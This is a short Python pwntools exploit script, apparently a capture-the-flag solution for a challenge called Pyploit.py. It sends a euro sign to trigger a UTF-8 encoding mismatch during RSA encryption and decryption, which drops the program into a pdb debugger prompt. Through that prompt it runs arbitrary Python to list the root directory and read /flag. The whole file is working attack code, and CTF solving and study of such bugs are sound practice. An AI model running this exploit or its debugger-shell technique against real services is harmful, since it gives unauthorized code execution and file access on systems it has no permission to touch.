#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Local or remote connection
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process(['python3', './Pyploit.py'])

# Trigger the UTF-8 encoding/decoding mismatch
p.sendlineafter(b'index: ', b'1')
p.sendlineafter(b'Text: ', '€'.encode('utf-8'))

# Capture the generated RSA ciphertext
ciphertext = p.recvline().strip()
log.info(f'Ciphertext: {ciphertext.decode()}')

# Decrypt the same ciphertext
p.sendlineafter(b'index: ', b'2')
p.sendlineafter(b'Code: ', ciphertext)

# The mismatch triggers pdb.set_trace()
p.recvuntil(b'ERROR!')
p.recvuntil(b'(Pdb) ')

log.success('PDB reached!')

# Execute Python code through PDB
p.sendline(
    b'!import os; print(os.listdir("/"))'
)
p.sendline(
    b'!print(open("/flag").read())'
)

p.interactive()